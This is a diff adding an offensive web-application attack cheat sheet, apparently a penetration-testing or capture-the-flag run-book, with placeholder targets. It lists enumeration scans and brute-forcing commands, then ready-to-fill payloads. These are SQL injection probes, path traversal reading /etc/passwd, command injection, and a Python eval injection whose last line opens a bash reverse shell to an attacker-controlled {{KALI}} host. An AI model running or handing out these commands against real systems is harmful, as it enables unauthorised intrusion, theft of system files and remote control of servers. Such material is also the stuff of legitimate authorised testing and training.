@@ -1,0 +1,48 @@
+# === NMAP WEB SCRIPTS ===
+nmap -sV -p {{PORT}} --script "http-headers,http-methods,http-title,http-robots.txt,http-server-header" {{TARGET}}
+nmap -sV -p {{PORT}} --script "http-vuln-*" {{TARGET}}
+
+# === DIRECTORY ENUMERATION (start immediately - don't wait) ===
+gobuster dir -u http://{{TARGET}} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,asp,aspx -t 40 -o gobuster_80.txt
+gobuster dir -u http://{{TARGET}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 40
+feroxbuster -u http://{{TARGET}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt --depth 3
+# HTTPS
+gobuster dir -u https://{{TARGET}} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40 -k
+
+# === MANUAL CHECKS (always do all of these) ===
+curl -sI http://{{TARGET}}
+curl -s http://{{TARGET}}/robots.txt
+curl -s http://{{TARGET}}/sitemap.xml
+curl -s http://{{TARGET}}/ | grep -i "version\|powered\|generator\|cms"
+# View page source for comments, hidden fields, JS endpoints
+curl -s http://{{TARGET}}/ | grep -Eo 'src="[^"]+"' | sort -u
+
+# === TECHNOLOGY FINGERPRINT ===
+whatweb http://{{TARGET}}
+nikto -h http://{{TARGET}} -output nikto_out.txt
+
+# === VHOST ENUMERATION ===
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.{{DOMAIN}}" -u http://{{TARGET}} -fs 0
+gobuster vhost -u http://{{TARGET}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# === COMMON VULNERABILITIES ===
+# SQL injection - quick test
+curl -s "http://{{TARGET}}/page?id=1'"
+curl -s "http://{{TARGET}}/page?id=1 OR 1=1--"
+# LFI/path traversal
+curl -s "http://{{TARGET}}/page?file=../../../../etc/passwd"
+curl -s "http://{{TARGET}}/page?file=....//....//....//etc/passwd"
+# File upload bypass - change Content-Type to image/jpeg, try double extension
+# Command injection test
+curl -s "http://{{TARGET}}/page?cmd=id"
+curl -s "http://{{TARGET}}/page?cmd=whoami%3Bid"
+
+# === API ENUMERATION ===
+# GET first - response reveals expected format and param names
+curl http://{{TARGET}}/api/
+curl -X POST http://{{TARGET}}/api/endpoint -H "Content-Type: application/json" -d '{"param":"value"}'
+curl -X POST http://{{TARGET}}/api/endpoint -d 'param=value'
+
+# === PYTHON EVAL/EXEC RCE ===
+curl -X POST http://{{TARGET}}/endpoint -d 'code=__import__("os").popen("id").read()'
+curl -X POST http://{{TARGET}}/endpoint --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/{{KALI}}/{{KALI_PORT}} 0>&1")'
